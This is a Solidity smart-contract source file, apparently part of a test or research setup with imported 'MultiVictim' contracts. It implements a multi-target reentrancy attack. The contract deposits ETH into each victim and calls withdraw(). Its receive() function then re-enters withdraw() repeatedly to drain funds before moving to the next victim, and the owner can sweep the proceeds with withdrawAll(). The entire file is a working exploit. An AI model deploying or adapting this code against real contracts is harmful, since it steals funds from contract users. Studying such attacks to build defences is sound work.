// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./MultiVictim1.sol";
import "./MultiVictim2.sol";
import "./MultiVictim3.sol";
// import "forge-std/console.sol";

contract MultiContractAttacker {
    address public owner;
    
    event ReentrancyAttempt(address victim, uint256 amount, bool success);
    event ReceiveCalled(address sender, uint256 amount);
    event AttackProgress(uint256 victimIndex, uint256 callCount);
    event LogWithdraw(address victim, uint256 amount, uint256 attackerVictimBalance, uint256 callCount);
    
    struct AttackParams {
        uint256 amount;
        uint256 calls;
        uint256 currentCalls;
    }
    
    mapping(address => AttackParams) public attackParams;
    address[] public victims;
    uint256 public currentVictimIndex;
    uint256 public victimCount;
    
    // Mapping to store victim contract interfaces
    mapping(address => address) public victimInterfaces;
    
    constructor(address[] memory _victims, uint256 _victimCount) {
        owner = msg.sender;
        victims = _victims;
        victimCount = _victimCount;
        
        // Store victim interfaces (assuming all victims implement the same interface)
        for (uint256 i = 0; i < _victimCount; i++) {
            victimInterfaces[_victims[i]] = _victims[i];
        }
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }
    
    function configureAttack(
        uint256[] memory amounts,
        uint256[] memory calls
    ) external onlyOwner {
        require(amounts.length == victimCount, "Length mismatch");
        require(calls.length == victimCount, "Length mismatch");
        
        for (uint256 i = 0; i < victimCount; i++) {
            attackParams[victims[i]] = AttackParams({
                amount: amounts[i],
                calls: calls[i],
                currentCalls: 0
            });
        }
    }
    
    function initiateMultiContractAttack() external payable {
        require(msg.sender == owner, "Only owner");
        require(currentVictimIndex == 0, "Attack already in progress");
        
        // Distribute the deposited ETH to victim contracts
        uint256 totalDeposit = 0;
        for (uint256 i = 0; i < victimCount; i++) {
            if (victims[i] != address(0)) {
                uint256 depositAmount = attackParams[victims[i]].amount * attackParams[victims[i]].calls;
                if (depositAmount > 0) {
                    // Deposit to victim contract first
                    (bool success, ) = victims[i].call{value: depositAmount}(
                        abi.encodeWithSignature("deposit()")
                    );
                    require(success, "Deposit to victim failed");
                    totalDeposit += depositAmount;
                }
            }
        }
        
        // Start the attack
        currentVictimIndex = 0;
        executeNextAttack();
    }
    
    function executeNextAttack() internal {
        if (currentVictimIndex >= victimCount) return;
        
        // Skip address(0) victims
        while (currentVictimIndex < victimCount && victims[currentVictimIndex] == address(0)) {
            currentVictimIndex++;
        }
        if (currentVictimIndex >= victimCount) return;
        
        address currentVictim = victims[currentVictimIndex];
        AttackParams storage params = attackParams[currentVictim];
        
        if (params.currentCalls < params.calls && params.amount > 0) {
            // Log victim, amount, attacker's balance in victim, and call count
            uint256 attackerVictimBalance = 0;
            (bool ok, bytes memory data) = currentVictim.call(abi.encodeWithSignature("getUserBalance(address)", address(this)));
            if (ok && data.length >= 32) {
                attackerVictimBalance = abi.decode(data, (uint256));
            }
            emit AttackProgress(currentVictimIndex, params.currentCalls);
            emit LogWithdraw(currentVictim, params.amount, attackerVictimBalance, params.currentCalls);
            // Call withdraw on the victim contract
            (bool success, ) = currentVictim.call(
                abi.encodeWithSignature("withdraw(uint256)", params.amount)
            );
            emit ReentrancyAttempt(currentVictim, params.amount, success);
            require(success, "Withdraw failed");
        }
    }
    
    receive() external payable {
        emit ReceiveCalled(msg.sender, msg.value);
        // Reentrancy attack: when we receive Ether, immediately withdraw again
        if (currentVictimIndex < victimCount) {
        address currentVictim = victims[currentVictimIndex];
        AttackParams storage params = attackParams[currentVictim];
        
            // Increment call count
        params.currentCalls++;
            emit AttackProgress(currentVictimIndex, params.currentCalls);
        
            // If we haven't reached the max calls, attack again
        if (params.currentCalls < params.calls) {
                // Reenter the same victim to exploit reentrancy
                (bool success, ) = currentVictim.call(
                    abi.encodeWithSignature("withdraw(uint256)", params.amount)
                );
                emit ReentrancyAttempt(currentVictim, params.amount, success);
                if (!success) {
                    // If reentrancy fails, move to next victim
                    currentVictimIndex++;
                    if (currentVictimIndex < victimCount) {
            executeNextAttack();
                    }
                }
        } else {
                // Move to next victim
            currentVictimIndex++;
                if (currentVictimIndex < victimCount) {
                executeNextAttack();
                }
            }
        }
    }
    
    function withdrawAll() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
    
    function getVictimParams(address victim) external view returns (AttackParams memory) {
        return attackParams[victim];
    }
}
